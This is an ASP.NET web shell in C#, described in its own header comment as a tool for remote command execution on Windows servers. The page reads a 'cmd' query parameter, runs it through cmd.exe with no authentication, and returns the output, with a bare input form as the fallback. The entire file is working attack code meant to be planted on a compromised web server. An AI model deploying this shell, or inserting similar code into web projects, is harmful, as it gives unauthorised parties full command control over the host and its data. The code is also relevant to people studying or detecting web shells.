<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%-- 
    Author: Bilel G
    Description: 
    This is an ASP.NET Web Shell written in C#. It allows remote command execution on a Windows server 
    via an HTTP request. The script reads a command from the query string, executes it using cmd.exe, 
    and returns both standard output and error output to the web page.
--%>

<script runat="server">
void Page_Load(object sender, EventArgs e) {
    // Check if the "cmd" parameter is provided in the URL
    if (Request["cmd"] != null) {
        string cmd = Request["cmd"]; // Get the command input from the URL query string
        
        Process proc = new Process(); // Create a new process
        proc.StartInfo.FileName = "cmd.exe"; // Set the process to run Windows Command Prompt
        proc.StartInfo.Arguments = "/c " + cmd; // Append user input to execute the command
        
        // Configure process execution options
        proc.StartInfo.UseShellExecute = false; // Do not use the shell to execute
        proc.StartInfo.RedirectStandardOutput = true; // Capture standard output
        proc.StartInfo.RedirectStandardError = true; // Capture error output

        proc.Start(); // Start the process

        // Read the command's output
        StreamReader stdOut = proc.StandardOutput;
        StreamReader stdErr = proc.StandardError;

        // Display the standard output and error output on the webpage (HTML encoded for security)
        Response.Write("<pre>" + Server.HtmlEncode(stdOut.ReadToEnd()) + "</pre>");
        Response.Write("<pre>" + Server.HtmlEncode(stdErr.ReadToEnd()) + "</pre>");

        proc.WaitForExit(); // Wait until the command execution is completed
        proc.Close(); // Close the process
    } else {
        // If no command is given, show a simple input form on the webpage
        Response.Write("<form method='GET'><input type='text' name='cmd'><input type='submit' value='Execute'></form>");
    }
}
</script>
